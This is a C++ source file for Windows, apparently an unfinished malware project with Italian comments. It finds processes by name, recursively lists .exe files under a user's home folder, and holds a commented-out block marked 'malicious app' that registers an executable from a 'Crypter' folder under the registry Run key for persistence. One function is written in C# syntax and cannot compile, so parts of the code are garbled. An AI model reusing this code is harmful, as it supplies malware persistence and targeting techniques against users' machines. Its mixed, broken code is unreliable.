#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>              
#include <WinUser.h>
#include <iostream>
#include <filesystem>
#include <string>

namespace fs = std::filesystem;
//"C:\\Users\\leona\\OneDrive\\Desktop\\prova"
bool check(std::filesystem::path dir){
    std::filesystem::path not_allowed[] = {NULL, NULL, "All Users", "Default"};
    for ( std::filesystem::path i : not_allowed){
        std::cout << i << std::endl;
        if(i == dir)
            return FALSE;
    }
    return TRUE;
}


int FindTarget(const char *procname) { //zi compila bho
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
            
    while (Process32Next(hProcSnap, &pe32)) {
            if (lstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    CloseHandle(hProcSnap);
            
    return pid;
}

char* GetProcessOwnerByID(int processId)
{
  IntPtr processHandle = IntPtr.Zero;
  IntPtr tokenHandle = IntPtr.Zero;
  try
  {
    processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
    if (processHandle == IntPtr.Zero)
      return "NO ACCESS";

    OpenProcessToken(processHandle, TOKEN_QUERY, out tokenHandle);
    using (WindowsIdentity wi = new WindowsIdentity(tokenHandle))
    {
      string user = wi.Name;
      return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
    }
  }
  finally
  {
    if (tokenHandle != IntPtr.Zero) CloseHandle(tokenHandle);
    if (processHandle != IntPtr.Zero) CloseHandle(processHandle);
  }
}

void iterate_folder(std::filesystem::path folder_path){

    try {
        for (const auto& entry : fs::directory_iterator(folder_path)) {
            if (entry.is_regular_file() && entry.path().extension() == ".exe") {
                std::cout << entry.path().filename() << std::endl;
            } 
            else if(entry.is_directory()){
                //std::cout << entry.path().filename() << std::endl;
                iterate_folder(entry.path());
            }   
        }
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Errore durante la scansione della directory: " << e.what() << std::endl;
    }
}
int main() {
    std::string directoryPath = "C:\\Users\\leona";  // Specifica il percorso della directory desiderata
    iterate_folder(directoryPath);



      /*

    HKEY hkey = NULL;
    // malicious app
    const char* exe = "C:\\Users\\leona\\OneDrive\\Desktop\\Crypter\\crypter_ultrasw3g\\pers.exe";

    // startup
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key
        RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
    */


}


               
               
               
               